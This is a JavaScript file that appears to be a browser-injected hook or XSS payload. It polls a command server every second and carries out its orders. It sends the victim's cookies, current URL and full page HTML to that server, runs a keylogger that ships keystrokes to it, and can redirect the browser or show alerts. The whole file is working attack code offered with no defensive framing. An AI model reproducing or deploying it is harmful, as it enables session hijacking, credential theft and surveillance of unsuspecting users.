(function () {
    var currentId = createUUID();
    var keys;

    var devUrl = "http://localhost:8080/";

    var script = document.createElement("SCRIPT");
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js';
    script.type = 'text/javascript';
    document.getElementsByTagName("head")[0].appendChild(script);

    var checkReady = function (callback) {
        if (window.jQuery) {
            callback(jQuery);
        }
        else {
            window.setTimeout(function () {
                checkReady(callback);
            }, 100);
        }
    };

    checkReady(function ($) {
        setInterval(
                function () {
                    $.ajax({
                               type: 'GET',
                               url: devUrl + 'ping/' + currentId,
                               contentType: 'text/plain',
                               xhrFields: {
                                   withCredentials: false
                               },
                               success: function (data) {
                                   if (data != 'ntp') {
                                       handleData(data);
                                   }
                               }
                           });
                }, 1000);
    });


    function startKeylogger() {
        $("body").on("keypress", function (e) {
            keys = keys + String.fromCharCode(e.which);
        });
    }

    function stopKeyLogger() {
        $("body").off("keypress");
        sendCommandToServer('receiveKeys', keys);
        keys = '';
    }

    var handleData = function (data) {
        console.dir(data);
        if (data.type == 'msg') {
            alert(data.metadata);
        } else if (data.type == 'getCookies') {
            sendCommandToServer("receiveUrl", document.cookie);
        } else if (data.type == 'getUrl') {
            sendCommandToServer("receiveUrl", window.location.href);
        } else if (data.type == 'getSite') {
            sendCommandToServer("receiveSite", document.documentElement.outerHTML);
        } else if (data.type == 'startLogger') {
            startKeylogger();
        } else if (data.type == 'stopLogger') {
            stopKeyLogger();
        } else if (data.type == 'goToUrl') {
            window.location.href = data.metadata;
        }

    };

    function sendCommandToServer(type, data) {
        $.ajax({
                   type: "POST",
                   url: devUrl + type + '/' + currentId,
                   data: data,
                   contentType: "application/json; charset=utf-8"
               });
    }

    function createUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

})();